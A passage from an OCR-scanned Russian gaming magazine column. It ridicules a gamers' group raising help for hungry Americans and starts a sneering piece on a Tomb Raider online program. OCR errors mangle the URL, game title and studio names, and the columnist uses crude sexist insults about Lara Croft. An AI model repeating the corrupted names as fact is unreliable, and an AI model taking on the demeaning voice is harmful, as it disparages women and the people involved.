меры Сплотились Против Голода». Они 
находятся по адресу \ѵѵѵѵѵ.дааЬ.огд. И это 
не шутка. Внимание, страстные поклон- 
ники обездоленных и просто давно не 
жравших! В середине января о своем су- 
ществовании заявила организация, ста- 
вящая своей целью сплочение игроков 
для помощи голодающим Соединенных 
Штатов Америки. Повторяю: именно 
штатовским, а не эфиопским, североко- 
рейским или, тем паче, российским. Ока- 
зывается, эти зажравшиеся янки там у се- 
бя тоже голодают. Вот уж не ожидал, на- 
до признаться. 

В общем, я не знаю, чего тут можно к 
сказанному добавить. Народец этот, судя 
по всему, настроен вполне обстоятельно. 
На что надеется - то незнамо, но надеет- 
ся. Кто хочет - присоединяйтесь. 

Знаете? А ведь это можно понимать 
как еще один показатель развития и 
преуспевания игровой индустрии. Подоб- 
ного рода сообщества никогда не поя- 
вятся там, где все глухо и бабок нет. Зна- 
чит, игры живут и побеждают - иначе бы 
около них не кучковались жратволюбцы 
из «СААН» и всякие иные идеологические 
отщепенцы. Прямо скажем - обнадежи- 
вает, господа, обнадеживает. 






Собствен ньмйТсмпЬ Каісіег ^ 



Дааааа... Честно говоря, я был пора- 
жен. До глубины души... Для начала приз- 
наюсь как на духу: я тамбовскую наез- 
дницу по ларской кличке Крофт на дух не 
переношу. Не люблю я мужеподоб- 
ных девушек, знаете ли, да еще и с / 
силиконовыми грудями, как у нее. 

Да и ТотЬ КаісІег худшеет от серии| 
к серии, постепенно вырождаясь в 
мыльную оперу с перезревшей 
шлюшкой в главной роли. Однако 
не будем оскорблять чувств и дос- 
тоинств всех тех, кто преклоняется 
перед ее чистым образом и ле- 
леют Ларочку как алую розу своей 
неразделенной любви. Специаль- 
но для них студия РІаіІапсІ, давно 
уж как греющаяся под теплым кры- 
лышком Еісіоз Іпіегасііѵе, сваргани- 
ла онлайновую программулину, 
работающую на неком подредак- 
тированном подобии языка ЬітІ и 



02Э 



Х:/пеѵз/да*пез 



